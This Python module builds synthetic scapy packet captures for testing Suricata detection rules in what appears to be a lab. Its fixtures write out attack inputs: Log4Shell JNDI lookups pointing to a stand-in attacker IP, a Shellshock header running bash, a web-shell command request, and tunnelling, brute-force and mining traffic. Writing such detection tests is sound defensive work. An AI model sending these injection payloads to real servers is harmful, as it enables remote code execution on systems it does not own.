"""Build the packet captures that exercise the Suricata rules.

Every capture is synthetic and built with scapy: complete TCP sessions with
valid sequence numbers so Suricata's stream and protocol parsers accept them.
One capture exists for each rule, plus a capture of ordinary traffic that must
raise no alert. `python -m detlab build-pcaps` writes them to simulations/pcaps/.

Addresses: 10.10.20.0/24 is the lab network. 203.0.113.0/24 and 198.51.100.0/24
are documentation ranges and stand for the internet.
"""

from collections.abc import Sequence

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet, Raw

BASE_TIME = 1794300000.0      # fixed, so rebuilt captures are identical
CLIENT = "10.10.20.15"        # workstation in the lab network
SERVER = "10.10.20.80"        # web server in the lab network
RESOLVER = "10.10.20.2"
ATTACKER = "203.0.113.10"
INTERNET = "198.51.100.25"
MAC = {CLIENT: "02:00:00:00:00:15", SERVER: "02:00:00:00:00:80", RESOLVER: "02:00:00:00:00:02",
       ATTACKER: "02:00:00:00:01:10", INTERNET: "02:00:00:00:01:25"}


class Capture:
    """Collects packets and gives each one a timestamp."""

    def __init__(self, step: float = 0.01):
        self.packets: list[Packet] = []
        self.clock = BASE_TIME
        self.step = step

    def add(self, packet: Packet) -> None:
        self.clock += self.step
        packet.time = self.clock
        self.packets.append(packet)

    def wait(self, seconds: float) -> None:
        self.clock += seconds


def _ip(src: str, dst: str) -> Packet:
    return Ether(src=MAC[src], dst=MAC[dst]) / IP(src=src, dst=dst, ttl=64)


def tcp_session(capture: Capture, client: str, server: str, sport: int, dport: int,
                exchanges: Sequence[tuple[bytes, bytes]]) -> None:
    """A full TCP conversation: handshake, request and response pairs, orderly close."""
    client_seq, server_seq = 1000, 5000
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="S", seq=client_seq))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="SA", seq=server_seq, ack=client_seq + 1))
    client_seq += 1
    server_seq += 1
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq, ack=server_seq))
    for request, response in exchanges:
        if request:
            capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="PA", seq=client_seq,
                                                  ack=server_seq) / Raw(request))
            client_seq += len(request)
            capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="A", seq=server_seq,
                                                  ack=client_seq))
        if response:
            for start in range(0, len(response), 1400):
                chunk = response[start:start + 1400]
                capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="PA", seq=server_seq,
                                                      ack=client_seq) / Raw(chunk))
                server_seq += len(chunk)
            capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq,
                                                  ack=server_seq))
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="FA", seq=client_seq, ack=server_seq))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="FA", seq=server_seq, ack=client_seq + 1))
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq + 1,
                                          ack=server_seq + 1))


def refused_connection(capture: Capture, client: str, server: str, sport: int, dport: int) -> None:
    """A SYN answered with a reset: a closed port, or a login attempt that never completes."""
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="S", seq=2000))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="RA", seq=0, ack=2001))


def dns_lookup(capture: Capture, client: str, name: str, answer: str = "198.51.100.25", sport: int = 53001) -> None:
    capture.add(_ip(client, RESOLVER) / UDP(sport=sport, dport=53) / DNS(id=sport, rd=1, qd=DNSQR(qname=name)))
    capture.add(_ip(RESOLVER, client) / UDP(sport=53, dport=sport)
                / DNS(id=sport, qr=1, rd=1, ra=1, qd=DNSQR(qname=name), an=DNSRR(rrname=name, ttl=60, rdata=answer)))


def http_request(method: str, path: str, host: str, headers: dict[str, str], body: bytes = b"") -> bytes:
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    lines += [f"{key}: {value}" for key, value in headers.items()]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def http_response(body: bytes, content_type: str = "text/html", status: str = "200 OK") -> bytes:
    head = (f"HTTP/1.1 {status}\r\nServer: nginx\r\nContent-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    return head.encode() + body


BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"
POWERSHELL_AGENT = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648"
PAGE = b"<html><body><h1>It works</h1></body></html>"
# The start of a PE file header and nothing more. It is not a program.
FAKE_EXE = b"MZ" + b"\x90\x00" * 31 + b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21" \
    + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 200


def tls_client_hello(server_name: str) -> bytes:
    """A TLS 1.2 ClientHello record with a server name, built by hand."""
    name = server_name.encode()
    sni = b"\x00\x00" + (len(name) + 5).to_bytes(2, "big") + (len(name) + 3).to_bytes(2, "big") + b"\x00" \
        + len(name).to_bytes(2, "big") + name
    extensions = sni + b"\x00\x0b\x00\x02\x01\x00" + b"\x00\x0a\x00\x04\x00\x02\x00\x17"
    body = (b"\x03\x03" + bytes(range(32)) + b"\x00"
            + b"\x00\x04\xc0\x2f\x00\x9c" + b"\x01\x00"
            + len(extensions).to_bytes(2, "big") + extensions)
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, "big") + handshake


def build() -> dict[str, tuple[list[Packet], list[int]]]:
    """Capture name -> (packets, SIDs that must fire on it)."""
    captures: dict[str, tuple[list[Packet], list[int]]] = {}

    c = Capture()
    dns_lookup(c, CLIENT, "c2-update.duckdns.org", ATTACKER)
    captures["dns_ddns_provider"] = (c.packets, [9000001])

    c = Capture()
    label = "6e6f7468696e6720746f2073656520686572652c206a7573742061206c6162"
    dns_lookup(c, CLIENT, f"{label}.{label[:40]}.t.lab-tunnel.com", ATTACKER)
    captures["dns_tunnel"] = (c.packets, [9000002])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49201, 80, [(
        http_request("GET", "/stage/run.ps1", ATTACKER, {"User-Agent": POWERSHELL_AGENT}),
        http_response(b"Write-Host 'lab sample, does nothing'\n", "text/plain"))])
    captures["http_powershell_download"] = (c.packets, [9000003])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49202, 80, [(
        http_request("GET", "/files/setup.bin", "downloads.lab-example.com", {"User-Agent": BROWSER}),
        http_response(FAKE_EXE, "application/octet-stream"))])
    captures["http_executable_download"] = (c.packets, [9000004])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40101, 80, [(
        http_request("GET", "/", "shop.lab-example.com",
                     {"User-Agent": "${jndi:ldap://203.0.113.10:1389/a}", "Accept": "*/*"}),
        http_response(PAGE))])
    tcp_session(c, ATTACKER, SERVER, 40102, 80, [(
        http_request("GET", "/search?q=${jndi:ldap://203.0.113.10:1389/a}", "shop.lab-example.com",
                     {"User-Agent": "curl/8.5.0"}),
        http_response(PAGE))])
    captures["http_log4shell"] = (c.packets, [9000005, 9000006])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40103, 80, [(
        http_request("GET", "/cgi-bin/status", "shop.lab-example.com",
                     {"User-Agent": "() { :; }; /bin/bash -c 'id'"}),
        http_response(b"ok\n", "text/plain"))])
    captures["http_shellshock"] = (c.packets, [9000007])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40104, 80, [(
        http_request("GET", "/uploads/img.php?cmd=whoami", "shop.lab-example.com", {"User-Agent": "curl/8.5.0"}),
        http_response(b"www-data\n", "text/plain"))])
    captures["http_web_shell"] = (c.packets, [9000008])

    c = Capture(step=0.2)
    for attempt in range(12):
        refused_connection(c, ATTACKER, SERVER, 41000 + attempt, 22)
        c.wait(1.5)
    captures["ssh_brute_force"] = (c.packets, [9000009])

    c = Capture(step=0.01)
    for port in range(1, 121):
        if port == 22:
            continue
        refused_connection(c, ATTACKER, SERVER, 42000 + port, port)
    captures["tcp_port_scan"] = (c.packets, [9000010])

    c = Capture()
    c.add(_ip(CLIENT, ATTACKER) / ICMP(type=8, id=7, seq=1) / Raw(b"lab-tunnel-data " * 64))
    c.add(_ip(ATTACKER, CLIENT) / ICMP(type=0, id=7, seq=1) / Raw(b"lab-tunnel-data " * 64))
    captures["icmp_tunnel"] = (c.packets, [9000011])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49203, 443, [(tls_client_hello("a1b2c3d4.ngrok.io"), b"")])
    captures["tls_tunnel_service"] = (c.packets, [9000012])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49204, 3333, [(
        b'{"id":1,"method":"mining.subscribe","params":["lab-miner/1.0"]}\n',
        b'{"id":1,"result":[[["mining.notify","1"]],"00",4],"error":null}\n')])
    captures["stratum_mining"] = (c.packets, [9000013])

    # Ordinary traffic. Nothing here may raise an alert.
    c = Capture(step=0.05)
    dns_lookup(c, CLIENT, "www.example.com")
    dns_lookup(c, CLIENT, "updates.lab-example.com", sport=53002)
    tcp_session(c, CLIENT, INTERNET, 49301, 80, [(
        http_request("GET", "/index.html", "www.example.com", {"User-Agent": BROWSER}), http_response(PAGE))])
    tcp_session(c, CLIENT, INTERNET, 49302, 80, [(
        http_request("GET", "/docs/guide.pdf?page=2", "www.example.com", {"User-Agent": BROWSER}),
        http_response(b"%PDF-1.7 lab sample", "application/pdf"))])
    tcp_session(c, INTERNET, SERVER, 40201, 80, [(
        http_request("GET", "/products.php?id=42&sort=name", "shop.lab-example.com", {"User-Agent": BROWSER}),
        http_response(PAGE))])
    tcp_session(c, CLIENT, INTERNET, 49303, 443, [(tls_client_hello("www.example.com"), b"")])
    for attempt in range(3):
        banner = b"SSH-2.0-OpenSSH_9.6\r\n"
        tcp_session(c, INTERNET, SERVER, 40300 + attempt, 22, [(banner, banner)])
        c.wait(20)
    c.add(_ip(CLIENT, INTERNET) / ICMP(type=8, id=9, seq=1) / Raw(b"abcdefghijklmnopqrstuvwabcdefghi" * 2))
    c.add(_ip(INTERNET, CLIENT) / ICMP(type=0, id=9, seq=1) / Raw(b"abcdefghijklmnopqrstuvwabcdefghi" * 2))
    captures["benign_traffic"] = (c.packets, [])
    return captures
